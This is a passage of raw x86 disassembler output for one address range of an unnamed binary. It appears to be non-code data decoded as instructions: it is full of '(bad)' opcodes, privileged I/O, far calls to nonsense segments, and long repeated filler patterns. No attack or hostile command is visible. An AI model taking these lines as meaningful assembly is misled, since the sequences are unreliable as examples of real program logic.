  414274:	or     al,0x25
  414276:	cmp    dl,BYTE PTR [eax]
	...
  414288:	add    BYTE PTR [eax],al
  41428a:	repz inc BYTE PTR [eax+0x46]
  41428e:	out    dx,al
  41428f:	jnp    0x414303
  414291:	inc    eax
  414292:	fstp   DWORD PTR [esp+esi*2-0x37]
  414296:	adc    DWORD PTR [esi+0x27],esp
  414299:	leave  
  41429a:	es cmp al,0x37
  41429d:	shl    DWORD PTR [edx],1
  41429f:	aaa    
  4142a0:	xor    cl,bl
  4142a2:	push   cs
  4142a3:	and    eax,0x3f1e0062
  4142a8:	ins    DWORD PTR es:[edi],dx
  4142a9:	add    al,0xc4
  4142ab:	imul   esp,DWORD PTR [ebx+0x7],0xfa624bde
  4142b2:	call   0x6c60:0xbf092c62
  4142b9:	or     esp,eax
  4142bb:	imul   esp,DWORD PTR [ebp-0x3f],0xffffffa5
  4142bf:	jne    0x4142e1
  4142c1:	mov    ebx,0x63759a
  4142c6:	inc    ecx
  4142c7:	jne    0x41432a
  4142c9:	fs in  eax,dx
  4142cb:	std    
  4142cc:	or     DWORD PTR ds:0x726b3dd9,ecx
  4142d2:	mov    dh,0x26
  4142d4:	outs   dx,BYTE PTR gs:[esi]
  4142d6:	jne    0x414337
  4142d8:	jb     0x414347
  4142da:	jb     0x41433e
  4142dc:	outs   dx,DWORD PTR gs:[esi]
  4142de:	jge    0x414310
  4142e0:	and    BYTE PTR [eax+0x67],ch
  4142e3:	bound  esi,QWORD PTR [eax+0x3a]
  4142e6:	lods   al,BYTE PTR ds:[esi]
  4142e7:	pop    ds
  4142e8:	jae    0x414361
  4142ea:	inc    esp
  4142eb:	sbb    al,0x65
  4142ed:	bound  eax,QWORD PTR [eax]
	...
  4142ff:	add    BYTE PTR [eax],dh
  414301:	outs   dx,BYTE PTR gs:[esi]
  414303:	jae    0x414331
  414305:	fs je  0x41437f
  414308:	xor    bh,BYTE PTR [ebx+0x61]
  41430b:	xor    BYTE PTR cs:[esi+0x69],bl
  41430f:	das    
  414310:	sahf   
  414311:	add    BYTE PTR [ecx],cl
  414313:	or     ah,BYTE PTR [ebx-0x6cfffffa]
  414319:	push   es
  41431a:	add    BYTE PTR [eax],al
  41431c:	xchg   ebx,eax
  41431d:	push   es
  41431e:	add    BYTE PTR [eax],al
  414320:	arpl   WORD PTR [esi],ax
  414322:	add    BYTE PTR [eax],al
  414324:	arpl   WORD PTR [esi],ax
  414326:	add    BYTE PTR [eax],al
  414328:	push   ebx
  414329:	push   es
  41432a:	add    BYTE PTR [eax],al
  41432c:	push   ebx
  41432d:	push   es
  41432e:	add    BYTE PTR [eax],al
  414330:	arpl   WORD PTR [esi],ax
  414332:	add    BYTE PTR [eax],al
  414334:	arpl   WORD PTR [esi],ax
  414336:	add    BYTE PTR [eax],al
  414338:	push   ebx
  414339:	push   es
  41433a:	add    BYTE PTR [eax],al
  41433c:	push   ebx
  41433d:	push   es
  41433e:	add    BYTE PTR [eax],al
  414340:	and    eax,DWORD PTR [esi]
  414342:	add    BYTE PTR [eax],al
  414344:	and    eax,DWORD PTR [esi]
  414346:	add    BYTE PTR [eax],al
  414348:	adc    eax,DWORD PTR [esi]
  41434a:	add    BYTE PTR [eax],al
  41434c:	adc    eax,DWORD PTR [esi]
  41434e:	add    BYTE PTR [eax],al
  414350:	cli    
  414351:	cwde   
  414352:	mov    dl,0x4e
  414354:	mov    eax,ds:0xfe2b201c
  414359:	xor    edi,ecx
  41435b:	push   esp
  41435c:	push   cs
  41435d:	adc    DWORD PTR [ebx-0x7f34d89e],esp
  414363:	or     DWORD PTR [eax],eax
	...
  414375:	add    BYTE PTR [ebp-0xf],al
  414378:	or     ecx,DWORD PTR [eax]
  41437a:	or     esp,DWORD PTR [eax-0x4c2997f6]
  414380:	jnp    0x4143d3
  414382:	test   bl,bl
  414384:	add    DWORD PTR [eax],eax
  414386:	cli    
  414387:	fild   DWORD PTR [ecx]
  414389:	add    dl,bh
  41438b:	fild   DWORD PTR [ecx]
  41438d:	add    dl,bh
  41438f:	fild   DWORD PTR [ecx]
  414391:	add    dl,bh
  414393:	fild   DWORD PTR [ecx]
  414395:	add    dl,bh
  414397:	fild   DWORD PTR [ecx]
  414399:	add    dl,bh
  41439b:	fild   DWORD PTR [ecx]
  41439d:	add    dl,bh
  41439f:	fild   DWORD PTR [ecx]
  4143a1:	add    dl,bh
  4143a3:	fild   DWORD PTR [ecx]
  4143a5:	add    dl,bh
  4143a7:	fild   DWORD PTR [ecx]
  4143a9:	add    dl,bh
  4143ab:	fild   DWORD PTR [ecx]
  4143ad:	add    dl,bh
  4143af:	fild   DWORD PTR [ecx]
  4143b1:	add    dl,bh
  4143b3:	fild   DWORD PTR [ecx]
  4143b5:	add    dl,bh
  4143b7:	fild   DWORD PTR [ecx]
  4143b9:	add    dl,bh
  4143bb:	fild   DWORD PTR [ecx]
  4143bd:	add    dl,bh
  4143bf:	fild   DWORD PTR [ecx]
  4143c1:	add    dl,bh
  4143c3:	fild   DWORD PTR [ecx]
  4143c5:	add    dl,bh
  4143c7:	fild   DWORD PTR [ecx]
  4143c9:	add    dl,bh
  4143cb:	fild   DWORD PTR [ecx]
  4143cd:	add    dl,bh
  4143cf:	fild   DWORD PTR [ecx]
  4143d1:	add    dl,bh
  4143d3:	fild   DWORD PTR [ecx]
  4143d5:	add    dl,bh
  4143d7:	fild   DWORD PTR [ecx]
	...
  4143e9:	add    BYTE PTR [eax],al
  4143eb:	add    dl,bh
  4143ed:	add    al,0xe7
  4143ef:	add    edi,edx
  4143f1:	add    al,0xe7
  4143f3:	add    edi,edx
  4143f5:	add    al,0xe7
  4143f7:	add    edi,edx
  4143f9:	add    al,0xe7
  4143fb:	add    edi,edx
  4143fd:	add    al,0xe7
  4143ff:	add    edi,edx
  414401:	add    al,0xe7
  414403:	add    edi,edx
  414405:	add    al,0xe7
  414407:	add    edi,edx
  414409:	add    al,0xe7
  41440b:	add    edi,edx
  41440d:	add    al,0xe7
  41440f:	add    edi,edx
  414411:	add    al,0xe7
  414413:	add    edi,edx
  414415:	add    al,0xe7
  414417:	add    edi,edx
  414419:	add    al,0xe7
  41441b:	add    edi,edx
  41441d:	add    al,0xe7
  41441f:	add    edi,edx
  414421:	add    al,0xe7
  414423:	add    edi,edx
  414425:	add    al,0xe7
  414427:	add    edi,edx
  414429:	add    al,0xe7
  41442b:	add    edi,edx
  41442d:	add    al,0xe7
  41442f:	add    edi,edx
  414431:	add    al,0xe7
  414433:	add    edi,edx
  414435:	add    al,0xe7
  414437:	add    edi,edx
  414439:	add    al,0xe7
  41443b:	add    edi,edx
  41443d:	add    al,0xe7
  41443f:	add    edi,edx
  414441:	add    al,0xe7
  414443:	add    edi,edx
  414445:	add    al,0xe7
  414447:	add    edi,edx
  414449:	add    al,0xe7
  41444b:	add    edi,edx
  41444d:	add    al,0xe7
  41444f:	add    eax,DWORD PTR [eax]
	...
  414461:	add    dl,bh
  414463:	add    al,0xe7
  414465:	add    edi,edx
  414467:	add    al,0xe7
  414469:	add    edi,edx
  41446b:	add    al,0xe7
  41446d:	add    edi,edx
  41446f:	add    al,0xe7
  414471:	add    edi,edx
  414473:	add    al,0xe7
  414475:	add    edi,edx
  414477:	add    al,0x0
  414479:	jmp    0xe9414977
  41447e:	stc    
  41447f:	add    al,0x0
  414481:	jmp    0xe941497f
  414486:	stc    
  414487:	add    al,0x0
  414489:	jmp    0xe9414987
  41448e:	stc    
  41448f:	add    al,0x0
  414491:	jmp    0xe941498f
  414496:	stc    
  414497:	add    al,0x0
  414499:	jmp    0xe9414997
  41449e:	stc    
  41449f:	add    al,0x0
  4144a1:	jmp    0xe941499f
  4144a6:	stc    
  4144a7:	add    al,0x0
  4144a9:	fadd   DWORD PTR [edi]
  4144ab:	ss xor al,0xd4
  4144ae:	or     eax,DWORD PTR ds:0x76468870
  4144b4:	jne    0x414444
  4144b6:	das    
  4144b7:	imul   eax,DWORD PTR [eax],0x62752179
  4144bd:	mov    edi,ecx
  4144bf:	pop    edi
  4144c0:	jne    0x41450e
  4144c2:	sub    BYTE PTR [ecx+0x77],bh
  4144c5:	jmp    0x4144ca
	...
  4144d6:	add    BYTE PTR [eax],al
  4144d8:	into   
  4144d9:	xor    dh,BYTE PTR [ecx]
  4144db:	sbb    eax,0x446a04cb
  4144e0:	or     DWORD PTR [ecx+esi*2-0x17],esi
  4144e4:	(bad)  
  4144e5:	xor    dh,BYTE PTR [ecx]
  4144e7:	cmc    
  4144e8:	sub    dh,BYTE PTR [edi]
  4144ea:	xor    eax,0x321ff9f1
  4144ef:	cli    
  4144f0:	adc    eax,0xd90b5f05
  4144f5:	pop    ds
  4144f6:	xor    bl,dl
  4144f8:	stc    
  4144f9:	pusha  
  4144fa:	arpl   WORD PTR ds:0xff6763e3,bx
  414500:	stc    
  414501:	js     0x414566
  414503:	add    BYTE PTR [eax+0x5f],al
  414506:	add    BYTE PTR [esp+eax*1+0x5f],ch
  41450a:	popa   
  41450b:	add    BYTE PTR [edx+0x35],dh
  41450e:	das    
  41450f:	add    BYTE PTR [ebx],ah
  414511:	push   0x663c736f
  414516:	jb     0x41457c
  414518:	repnz or BYTE PTR [eax+0x65],ch
  41451c:	aaa    
  41451d:	imul   eax,DWORD PTR [bx+si],0x46
  414521:	data16 outs dx,BYTE PTR ds:[esi]
  414523:	imul   ebp,DWORD PTR [esi],0x70
  414526:	add    BYTE PTR [ecx+esi*4+0x69],ah
  41452a:	arpl   WORD PTR [edi-0x4b],bp
  41452d:	add    dh,BYTE PTR [edx+esi*2-0x52]
  414531:	jae    0x4145a7
  414533:	outs   dx,BYTE PTR ds:[esi]
  414534:	test   BYTE PTR [ecx],bh
  414536:	add    BYTE PTR [ecx],dh
  414538:	mov    dl,0x39
  41453a:	sub    eax,0x31
	...
  41454b:	add    BYTE PTR [eax],al
  41454d:	add    BYTE PTR [edx+0x446c6502],dh
  414553:	pusha  
  414554:	popa   
  414555:	jns    0x4145bb
  414557:	jne    0x414559
  414559:	xor    DWORD PTR [ecx+0x33],esi
  41455c:	xor    al,0x35
  41455e:	ins    DWORD PTR es:[edi],dx
  41455f:	pop    ds
  414560:	add    BYTE PTR [ebx+0x7b],dh
  414563:	imul   esp,DWORD PTR [edi+ebp*2+0x3c],0xf0322d09
  41456b:	xor    al,0x31
  41456d:	ss in  al,dx
  41456f:	xor    BYTE PTR ds:0x72613000,dh
  414575:	imul   eax,eax,0x2e730074
  41457b:	outs   dx,DWORD PTR ds:[si]
  41457d:	push   0x6166ba
  414582:	es push 0x72ee746f
  414588:	add    BYTE PTR [ebx+0x4],ah
  41458b:	pop    esp
  41458c:	jo     0x414603
  41458e:	cli    
  41458f:	maxps  xmm6,XMMWORD PTR [edx-0x6]
  414593:	or     esi,DWORD PTR [edx+0x67]
  414596:	int3   
  414597:	cli    
  414598:	pop    esi
  414599:	jno    0x414544
  41459b:	fld    TBYTE PTR [ebp+0x67]
  41459e:	xchg   ebp,eax
  41459f:	(bad)  
  4145a0:	pop    esi
  4145a1:	jb     0x41459d
  4145a3:	add    eax,0xb9a66d65
  4145a8:	fs ins BYTE PTR es:[edi],dx
  4145aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145ab:	(bad)  [esi+ebp*2-0x6b]
  4145af:	shl    BYTE PTR [ebp+0x0],0x0
	...
  4145c3:	add    BYTE PTR [eax-0x768c8d38],dl
  4145c9:	in     al,dx
  4145ca:	add    DWORD PTR [edi],ebp
  4145cc:	sub    bl,ch
  4145ce:	xor    al,0x32
  4145d0:	sub    esp,ebx
  4145d2:	outs   dx,BYTE PTR ds:[esi]
  4145d3:	push   0x7660b85b
  4145d8:	push   edi
  4145d9:	mov    al,BYTE PTR [ecx]
  4145db:	dec    ax
  4145dd:	mov    DWORD PTR [eax+0x64],esp
  4145e0:	pop    ebp
  4145e1:	mov    DWORD PTR [ecx],eax
  4145e3:	imul   edx,DWORD PTR [ebx+0x70],0xdc486365
  4145ea:	fs jno 0x41460b
  4145ed:	xchg   BYTE PTR [ecx],al
  4145ef:	jno    0x41460e
  4145f1:	jnp    0x414655
  4145f3:	arpl   WORD PTR [eax],bp
  4145f5:	fdiv   QWORD PTR [edx+0x73]
  4145f8:	sub    al,BYTE PTR [ecx+0x72]
  4145fb:	imul   ebx,DWORD PTR [ebx],0x3e
  4145fe:	add    al,0x6b
  414600:	and    edi,DWORD PTR [ebx]
  414602:	ins    BYTE PTR es:[edi],dx
  414603:	pop    edi
  414604:	pop    ds
  414605:	xor    BYTE PTR [ecx+eiz*2],al
  414608:	adc    al,BYTE PTR [ecx+0x5d]
  41460b:	jno    0x4145ec
  41460d:	fld    TBYTE PTR [edx+0x6e]
  414610:	out    0x40,al
  414612:	jb     0x414682
  414614:	fbstp  TBYTE PTR [edi]
  414616:	add    al,0x6a
  414618:	int    0x4
  41461a:	sbb    ch,BYTE PTR [ecx+ecx*8+0x63]
  41461e:	out    0x5d,eax
  414620:	leave  
  414621:	popa   
  414622:	add    bh,BYTE PTR [ebx-0x29]
  414625:	ja     0x41460e
  414627:	popa   
	...
  414638:	add    BYTE PTR [eax],al
  41463a:	into   
  41463b:	addr16 cli 
  41463d:	jo     0x4145d8
  41463f:	push   0x71cd61e7
  414644:	or     al,0x62
  414646:	lds    esp,FWORD PTR [eax-0x5]
  414649:	add    ebp,DWORD PTR [ebx-0x708e3788]
  41464f:	arpl   cx,bx
  414651:	jo     0x41464d
  414653:	xor    al,0x17
  414655:	xor    al,0xca
  414657:	xor    al,0x17
  414659:	add    al,0x8a
  41465b:	ja     0x414616
  41465d:	jae    0x4146c5
  41465f:	(bad)  
  414660:	out    0x69,eax
  414662:	pop    edi
  414663:	ja     0x414630
  414665:	bound  edx,QWORD PTR [ebp+eax*1-0x3b]
  414669:	bound  edx,QWORD PTR [ebp+0x71]
  41466c:	pop    DWORD PTR [ebx]
  41466e:	dec    ebx
  41466f:	jb     0x4145fd
  414671:	pop    cx
  414673:	ja     0x41465c
  414675:	bound  ecx,QWORD PTR [ebx+0x5d]
  414678:	jnp    0x4146d8
  41467a:	inc    ebp
  41467b:	add    eax,0x712b6e89
  414680:	test   BYTE PTR [ecx-0x6],dh
  414683:	pop    esp
  414684:	mov    WORD PTR [edx+0x2c],fs
  414687:	bound  edi,QWORD PTR [ebp+0x3]
  41468a:	sub    ah,BYTE PTR [edx+0x57]
  41468d:	je     0x4146a8
  41468f:	ja     0x414678
  414691:	sub    al,0xc7
  414693:	xor    ebx,DWORD PTR [esi]
  414695:	sub    eax,0x6be733cf
  41469a:	or     DWORD PTR [ebx+0x3b],ebx
  41469d:	pop    edi
	...
  4146ae:	add    BYTE PTR [eax],al
  4146b0:	call   0xe4a691b9
  4146b5:	popa   
  4146b6:	add    BYTE PTR [ebp-0x1f],al
  4146b9:	add    al,0x5f
  4146bb:	aas    
  4146bc:	fidiv  DWORD PTR [esi+0x63]
  4146bf:	push   ds
  4146c0:	(bad)  
  4146c1:	jo     0x41472b
  4146c3:	push   cs
  4146c4:	aad    0x4b
  4146c6:	jno    0x4146b1
  4146c8:	fcomp  DWORD PTR [edx+0x65]
  4146cb:	add    al,0xd2
  4146cd:	jne    0x4146cf
  4146cf:	or     ah,BYTE PTR [esi-0x5ef28db5]
  4146d5:	add    BYTE PTR [di],cl
  4146d8:	cdq    
  4146d9:	pop    edx
  4146da:	addr16 add al,0x92
  4146dd:	add    al,0x2f
  4146df:	sbb    cl,cl
  4146e1:	sbb    eax,DWORD PTR [eax]
  4146e3:	shr    DWORD PTR [edx+ebx*2+0x67a7c06e],cl
  4146ea:	jb     0x4146d5
  4146ec:	mov    ah,BYTE PTR [ebx+0x6e]
  4146ef:	into   
  4146f0:	pop    ebp
  4146f1:	push   0x5b58d100
  4146f6:	outs   dx,BYTE PTR ds:[esi]
  4146f7:	enter  0x551,0x6f
  4146fb:	enter  0x7263,0x71
  4146ff:	mov    eax,ds:0x995f5cf9
  414704:	dec    ecx
  414705:	je     0x414707
  414707:	test   BYTE PTR [eax+0x71],bl
  41470a:	jb     0x41468c
  41470c:	inc    ecx
  41470d:	add    eax,0x762a8870
  414712:	add    BYTE PTR [eax+0x0],cl
	...
  414724:	add    BYTE PTR [eax],al
  414726:	sbb    BYTE PTR [edi+ebx*2-0x78],cl
  41472a:	sbb    BYTE PTR ds:0x35cdb436,al
  414730:	xor    bl,BYTE PTR [eax]
  414732:	dec    BYTE PTR [ebx+0x6b]
  414735:	dec    eax
  414736:	sbb    BYTE PTR [ecx+0x5f],ah
  414739:	jmp    0x41b5a159
  41473e:	pop    ds
  41473f:	pop    ebx
  414740:	add    BYTE PTR gs:[ebx+0x5e],ah
  414744:	outs   dx,BYTE PTR gs:[esi]
  414746:	mov    ah,0x5d
  414748:	jb     0x41474a
  41474a:	mov    esi,0xb6687467
  41474f:	jb     0x414751
  414751:	jae    0x414740
  414753:	imul   esi,DWORD PTR [bx+si+0x1a],0x1
  414758:	push   0x65
  41475a:	loopne 0x4147cf
  41475c:	gs arpl dx,si
  41475f:	add    BYTE PTR [ebx+0x65],dh
  414762:	pcmpgtb mm5,QWORD PTR [ebx+0x6d]
  414766:	test   BYTE PTR [eax],0x70
  414769:	outs   dx,DWORD PTR ds:[esi]
  41476a:	clc    
  41476b:	pop    ebp
  41476c:	imul   ebp,DWORD PTR [edi+0x1d],0x2c6c6507
  414773:	ins    DWORD PTR es:[edi],dx
  414774:	popa   
  414775:	jns    0x4147b3
  414777:	ins    BYTE PTR es:[edi],dx
  414778:	sub    eax,0x2d31e200
  41477d:	xor    edx,esp
  41477f:	add    BYTE PTR [ecx+0x75],ch
  414782:	mov    al,0x72
  414784:	pop    ebp
  414785:	outs   dx,BYTE PTR ds:[esi]
  414786:	mov    ah,0x6
  414788:	push   0x65
	...
  414799:	add    BYTE PTR [eax],al
  41479b:	add    BYTE PTR [edi-0x2c9a968a],bh
  4147a1:	dec    eax
  4147a2:	jno    0x414817
  4147a4:	ja     0x4147ef
  4147a6:	outs   dx,BYTE PTR ds:[esi]
  4147a7:	add    BYTE PTR [ecx+0x61],ch
  4147aa:	outs   dx,DWORD PTR ds:[esi]
  4147ab:	ins    DWORD PTR es:[edi],dx
  4147ac:	jp     0x414812
  4147ae:	popa   
  4147af:	add    BYTE PTR [eax+esi*2],bh
  4147b2:	pop    ebp
  4147b3:	outs   dx,BYTE PTR ds:[esi]
  4147b4:	test   BYTE PTR [ebp+0x0],bl
  4147b7:	je     0x41482f
  4147b9:	jae    0x41482f
  4147bb:	imul   edi,DWORD PTR [ebp+0x5f],0x76236100
  4147c2:	ins    BYTE PTR es:[edi],dx
  4147c3:	mov    gs:0x2b636565,eax
  4147c9:	pop    esp
  4147ca:	ins    BYTE PTR es:[edi],dx
  4147cb:	ins    BYTE PTR es:[edi],dx
  4147cc:	cli    
  4147cd:	cmp    BYTE PTR [eax+esi*2],al
  4147d0:	pop    ss
  4147d1:	cmp    eax,0x2efa6365
  4147d6:	addr16 popa 
  4147d8:	call   0x2b41c01d
  4147dd:	fsubr  QWORD PTR [edx+0x72]
  4147e0:	fstp   TBYTE PTR [esi]
  4147e2:	addr16 add ch,cl
  4147e5:	adc    al,0x60
  4147e7:	ins    BYTE PTR es:[edi],dx
  4147e8:	jecxz  0x4147e6
  4147ea:	pop    esi
  4147eb:	add    bl,dl
  4147ed:	jmp    DWORD PTR [eax+0x76]
  4147f0:	xlat   BYTE PTR ds:[ebx]
  4147f1:	adc    al,0x61
  4147f3:	jae    0x4147dd
  4147f5:	fistp  DWORD PTR [edi+0x67]
  4147f8:	cdq    
  4147f9:	cli    
  4147fa:	pop    edi
  4147fb:	arpl   dx,di
  4147fd:	test   eax,0x3637
	...
  414812:	in     al,0xb1
  414814:	aaa    
  414815:	add    BYTE PTR [edi-0x5c999838],ah
  41481b:	mov    ecx,0xc79b6501
  414820:	push   0x1d49b75
  414825:	outs   dx,WORD PTR ds:[esi]
  414827:	mov    edi,0xb15d775e
  41482c:	xor    al,0x0
  41482e:	pop    ebx
  41482f:	scas   eax,DWORD PTR es:[edi]
  414830:	jbe    0x41489a
  414832:	dec    ebp
  414833:	test   al,0x68
  414835:	add    BYTE PTR [edx+0x7d],ah
  414838:	pop    ecx
  414839:	pop    edi
  41483a:	bound  edi,QWORD PTR [ebp+0x1]
  41483d:	jo     0x414894
  41483f:	xor    DWORD PTR [ecx+0x0],0x58
  414843:	push   0x95297168
  414848:	pop    edi
  414849:	gs cli 
  41484b:	jge    0x4148aa
  41484d:	pop    edi
  41484e:	adc    bh,BYTE PTR [esi+0x5d]
  414851:	pop    edi
  414852:	adc    bl,ah
  414854:	pusha  
  414855:	ja     0x414860
  414857:	add    eax,0x601b6357
  41485c:	sbb    BYTE PTR [ecx+edx*1],al
  41485f:	fs pop ebx
  414861:	js     0x414875
  414863:	pusha  
  414864:	push   esi
  414865:	add    al,0xdb
  414867:	arpl   WORD PTR [ebp+0x63],dx
  41486a:	(bad)  
  41486b:	arpl   di,sp
  41486d:	je     0x41484c
  41486f:	pop    eax
  414870:	cmp    eax,0x3904e867
  414875:	popa   
	...
  414886:	add    BYTE PTR [eax],al
  414888:	fcomp  DWORD PTR [edi+0x19]
  41488b:	js     0x414887
  41488d:	bound  ecx,QWORD PTR [esi]
  41488f:	jbe    0x41486a
  414891:	jb     0x41489f
  414893:	jbe    0x41488f
  414895:	arpl   WORD PTR [edx],bx
  414897:	push   0x40f619c
  41489c:	test   al,0x63
  41489e:	or     bl,BYTE PTR [ecx+ebx*4+0x58]
  4148a2:	out    0x75,eax
  4148a4:	mov    ebp,0xa765fd5b
  4148a9:	jno    0x414892
  4148ab:	push   0x62d35b89
  4148b0:	mov    BYTE PTR [edi+edx*8],al
  4148b3:	popfw  
  4148b5:	pop    edx
  4148b6:	aam    0x77
  4148b8:	cli    
  4148b9:	(bad)  
  4148ba:	enter  0x6177,0x66
  4148be:	int    0x3
  4148c0:	pop    ebx
  4148c1:	pop    eax
  4148c2:	(bad)  
  4148c3:	pop    esp
  4148c4:	push   ebp
  4148c5:	(bad)  
  4148c6:	out    0x65,eax
  4148c8:	xor    eax,0x4566935e
  4148cd:	add    eax,0x645b609a
  4148d2:	mov    WORD PTR [ebp+0xd],?
  4148d5:	add    eax,0x5c1b5a7c
  4148da:	mov    WORD PTR [edx-0x6],gs
  4148dd:	bound  edx,QWORD PTR [eax+0x5a1977]
  4148e3:	mov    ecx,?
  4148e5:	pop    esp
  4148e6:	arpl   WORD PTR [ebp+0x35],di
  4148e9:	pop    edx
  4148ea:	das    
  4148eb:	jmp    0x4148f0
	...
  4148fc:	add    BYTE PTR [eax],al
  4148fe:	adc    al,0x5c
  414900:	addr16 dec edi
  414902:	sbb    eax,0x194d005c
  414907:	pop    esi
  414908:	ins    DWORD PTR es:[edi],dx
  414909:	push   ebp
  41490a:	fld    DWORD PTR [ecx+esi*2]
  41490d:	dec    eax
  41490e:	int    0x47
  414910:	outs   dx,BYTE PTR ds:[esi]
  414911:	xor    eax,0x4a0047c6
  414916:	fistp  DWORD PTR [ebx+0x70]
  414919:	dec    eax
  41491a:	leave  
  41491b:	add    al,0x64
  41491d:	adc    cl,bl
  41491f:	pop    ebx
  414920:	ins    DWORD PTR es:[edi],dx
  414921:	psrld  mm0,QWORD PTR [esp+esi*2]
  414925:	or     cl,dl
  414927:	pop    eax
  414928:	ins    DWORD PTR es:[edi],dx
  414929:	sbb    edi,esi
  41492b:	pop    esi
  41492c:	ins    DWORD PTR es:[edi],dx
  41492d:	sti    
  41492e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41492f:	pop    ebx
  414930:	add    BYTE PTR [ebx],dl
  414932:	fwait
  414933:	pop    esp
  414934:	outs   dx,BYTE PTR ds:[esi]
  414935:	mov    edx,0xfb002ee8
  41493a:	mov    al,0x65
  41493c:	push   0x6087c8
  414941:	retf   
  414942:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414943:	pop    edi
  414944:	outs   dx,BYTE PTR ds:[esi]
  414945:	ret    0x2cc8
  414948:	xor    ch,cl
  41494a:	imul   esp,DWORD PTR [edi+ebx*2-0x36],0xe9716451
  414952:	pop    esi
  414953:	pop    edx
  414954:	ins    DWORD PTR es:[edi],dx
  414955:	vdivpd xmm5,xmm0,XMMWORD PTR [esi+edi*4+0x52]
  41495b:	fs jb  0x414947
  41495e:	inc    esi
  41495f:	ins    WORD PTR es:[edi],dx
  414961:	mov    es,WORD PTR [eax]
	...
  414973:	add    BYTE PTR [ebp+0x64],cl
  414976:	jb     0x414961
  414978:	push   edi
  414979:	dec    eax
  41497a:	outs   dx,BYTE PTR ds:[esi]
  41497b:	mov    BYTE PTR [ebx],bl
  41497d:	dec    eax
  41497e:	add    BYTE PTR [eax],al
  414980:	mov    DWORD PTR [edx+0x69],esp
  414983:	and    BYTE PTR gs:[ebx*2+0x5d5d6f73],al
  41498b:	jae    0x414a0c
  41498d:	pop    ebp
  41498e:	add    BYTE PTR [esi+0x2a],dh
  414991:	fs je  0x414a03
  414994:	and    DWORD PTR [edx+0x0],ebx
  414997:	ins    BYTE PTR es:[edi],dx
  414998:	xor    al,0x47
  41499a:	outs   dx,DWORD PTR fs:[esi]
  41499c:	xor    eax,0x70322d01
  4149a1:	jo     0x414a16
  4149a3:	gs push ebx
  4149a5:	xor    BYTE PTR [edx],dh
  4149a7:	xor    esp,DWORD PTR [eax+0x35]
  4149aa:	sub    eax,0x5d6d1000
  4149af:	jb     0x4149a0
  4149b1:	jb     0x414a14
  4149b3:	imul   edx,DWORD PTR [ebx+0x5e],0x61
  4149b7:	outs   dx,DWORD PTR ds:[esi]
  4149b8:	loope  0x414a19
  4149ba:	popa   
  4149bb:	add    BYTE PTR [edx+ecx*2],cl
  4149be:	outs   dx,BYTE PTR ds:[esi]
  4149bf:	outs   dx,BYTE PTR ds:[esi]
  4149c0:	(bad)  
  4149c1:	jb     0x4149c3
  4149c3:	ins    DWORD PTR es:[edi],dx
  4149c4:	repnz pop edi
  4149c6:	arpl   WORD PTR [ecx-0x12],bp
  4149c9:	add    BYTE PTR [edx+esi*2-0x6],dh
  4149cd:	inc    esi
  4149ce:	gs je  0x4149eb
  4149d1:	add    ebp,DWORD PTR [ebx+0x6e]
  4149d4:	aaa    
  4149d5:	dec    eax
  4149d6:	outs   dx,BYTE PTR ds:[esi]
  4149d7:	add    BYTE PTR gs:[eax],al
	...
  4149ea:	adc    esi,DWORD PTR [eax]
  4149ec:	xor    dh,BYTE PTR [ebx]
  4149ee:	ret    0x5f64
  4149f1:	add    al,al
  4149f3:	dec    edx
  4149f4:	gs arpl ax,cx
  4149f7:	pop    ebp
  4149f8:	outs   dx,BYTE PTR ds:[esi]
  4149f9:	add    BYTE PTR [ecx-0x6b969193],bh
  4149ff:	je     0x414a01
  414a01:	arpl   WORD PTR [ebx+0x74],bp
  414a04:	gs jae 0x4149da
  414a07:	jb     0x414a66
  414a09:	jae    0x414a05
  414a0b:	mov    dh,BYTE PTR [esi+0x30]
  414a0e:	sub    BYTE PTR [eax+0x6b275f01],al
  414a14:	jne    0x414a7d
  414a16:	adc    al,0xdc
  414a18:	jb     0x414a8a
  414a1a:	sbb    ebp,DWORD PTR [edx+0x5a]
  414a1d:	ja     0x414a19
  414a1f:	jl     0x414a86
  414a21:	imul   esp,DWORD PTR [ebx],0x4e
  414a24:	add    al,0x6b
  414a26:	pop    ds
  414a27:	dec    edx
  414a28:	pusha  
  414a29:	addr16 or al,0xdc
  414a2c:	ins    WORD PTR es:[edi],dx
  414a2e:	in     eax,0x3e
  414a30:	pusha  
  414a31:	arpl   dx,di
  414a33:	xor    eax,0x35df6772
  414a38:	push   0x5d43fa71
  414a3d:	jo     0x414a1e
  414a3f:	(bad)  [edx+0x68]
  414a42:	fisttp DWORD PTR [edi]
  414a44:	pop    ebp
  414a45:	imul   edi,edx,0xfffffff5
  414a48:	pop    edx
  414a49:	outs   dx,BYTE PTR ds:[esi]
  414a4a:	xabort 0x5d
  414a4d:	add    BYTE PTR fs:[eax],al
	...
  414a60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a61:	fistp  DWORD PTR [ebp+0x6d]
  414a64:	popf   
  414a65:	adc    bl,BYTE PTR [ebx+0x6e]
  414a68:	popf   
  414a69:	fistp  DWORD PTR [ecx+0x5f]
  414a6c:	test   al,0xff
  414a6e:	data16 ja 0x414a6b
  414a71:	jmp    0x6c:0xb8a16d60
  414a78:	int    0xe
  414a7a:	xor    eax,0x5ec1fa35
  414a7f:	jno    0x414ae0
  414a81:	int3   
  414a82:	pop    ecx
  414a83:	add    BYTE PTR [esi-0x57],bl
  414a86:	bound  ebp,QWORD PTR [ecx+0x63]
  414a89:	fsub   QWORD PTR [ebp+0x67]
  414a8c:	push   ebp
  414a8d:	lds    esi,FWORD PTR [ebp+0x5f]
  414a90:	data16 fsub QWORD PTR [eax+eax*1+0x46]
  414a95:	add    eax,0x6154788f
  414a9a:	test   BYTE PTR [ecx-0x6],dh
  414a9d:	jno    0x414a36
  414a9f:	pop    esp
  414aa0:	sub    BYTE PTR [ebx+edx*4+0x3],bl
  414aa4:	sbb    BYTE PTR [ebp+edx*4+0x67],ah
  414aa8:	sbb    eax,0xc68e771
  414aad:	jno    0x414a3b
  414aaf:	jno    0x414aab
  414ab1:	arpl   WORD PTR [ebp+0x77],di
  414ab4:	and    dl,BYTE PTR [esi+0x55]
  414ab7:	imul   edi,edx,0x61
  414aba:	dec    esi
  414abb:	jb     0x414ac1
  414abd:	pusha  
  414abe:	pop    ebx
  414abf:	js     0x414a9a
  414ac1:	add    al,0x3f
  414ac3:	pop    ebp
	...
  414ad4:	add    BYTE PTR [eax],al
  414ad6:	fistp  DWORD PTR [ecx+0x4c]
